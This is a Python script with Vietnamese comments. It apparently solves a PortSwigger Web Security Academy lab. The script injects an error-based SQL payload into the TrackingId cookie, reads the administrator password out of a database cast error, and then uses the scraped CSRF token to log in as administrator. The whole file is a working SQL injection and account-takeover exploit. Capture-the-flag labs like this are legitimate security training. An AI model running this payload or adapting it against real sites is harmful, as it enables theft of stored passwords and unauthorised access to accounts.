import requests
import re
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

cookies = {"TrackingId": "", "session": ""}

res = requests.get(base_url)
cookies["session"] = res.cookies.get("session")

# Dò mật khẩu
payload_template = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
cookies["TrackingId"] = payload_template

res = requests.get(base_url, cookies=cookies)

# Tìm lỗi kiểu: invalid input syntax for type integer: "abc123"
match = re.search(r'invalid input syntax.*?:\s*"([^"]+)"', res.text)
if match:
    password = match.group(1)
    print(f"[+] Mật khẩu administrator: {password}")
    print(f"[!] Bắt đầu đăng nhập...")
else:
    print("[-] Không tìm được mật khẩu.")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")